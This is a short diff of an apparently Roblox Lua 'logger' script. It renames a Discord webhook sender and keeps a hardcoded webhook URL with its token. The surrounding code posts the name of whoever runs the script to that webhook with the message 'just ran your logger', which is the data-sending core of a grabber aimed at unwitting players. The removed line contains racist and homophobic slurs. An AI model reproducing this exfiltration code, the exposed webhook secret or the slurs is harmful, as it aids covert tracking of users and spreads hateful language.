@@ -12,7 +12,7 @@ local webhookcheck =
 local url =
    "https://discord.com/api/webhooks/1394003704746741781/sCHgs18dUx_faqRL7KJZkmngr97mY3wGnuXCDxktZwc0xa2ifOC90cp7P5MqMtercJvH" --pretty obvious what to do here
 local data = {
-            ["username"] = "NIGGER FAGGOT CLANKER", --webhook name thing idk
+            ["username"] = "Salmon-L0G", --webhook name thing idk
             ["avatar_url"] = "https://cdn.upload.systems/uploads/haO2MM1R.png", --avatar image url
     
     ["content"] = " @everyone **" ..game.Players.LocalPlayer.Name.. "** just ran your logger", --normal message
